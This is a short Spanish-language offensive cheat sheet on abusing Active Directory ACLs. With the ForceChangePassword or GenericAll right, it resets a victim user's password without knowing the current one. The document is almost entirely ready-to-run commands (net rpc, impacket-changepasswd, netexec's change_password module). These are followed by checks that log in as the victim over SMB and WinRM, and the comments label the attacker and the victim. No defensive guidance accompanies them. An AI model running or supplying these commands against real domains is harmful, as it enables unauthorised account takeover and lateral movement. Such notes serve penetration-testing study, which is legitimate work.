# Abuso ACL 

Tags: #Linux #ForceChangePassword #AD #ACL #Net 

## ForceChangePassword sobre Usuario 

```bash 
Paso 1:
❯ net rpc password "TargetUser" "NewPass123!" -U "domain.corp"/"user"%"passwd" -S IP_DC
# Requiere ForceChangePassword o GenericAll sobre TargetUser
# Cambia la contraseña sin conocer la actual
	# TargetUser = Usuario víctima 
	# user%passwd = Usuario atacante y su password 

Opción 2 - Más limpio que net rpc en entornos modernos
❯ impacket-changepasswd domain.corp/targetuser -newpass 'NewPass123!' -authuser user -authpass passwd -dc-ip IP_DC

Opción 3 - Alternativa con netexec
❯ nxc smb <IP_DC> -u 'user' -p 'passwd' -M change_password -o USER=targetuser NEWPASS='NewPass123!'
```

```bash 
Paso 2:
# Verificar el cambio de password 
❯ nxc smb IP_DC -u "TargetUser" -p "NewPass123!" 

# Verificar el ingreso por EvilWinRM
❯ nxc winrm IP_DC -u "TargetUser" -p "NewPass123!" 
```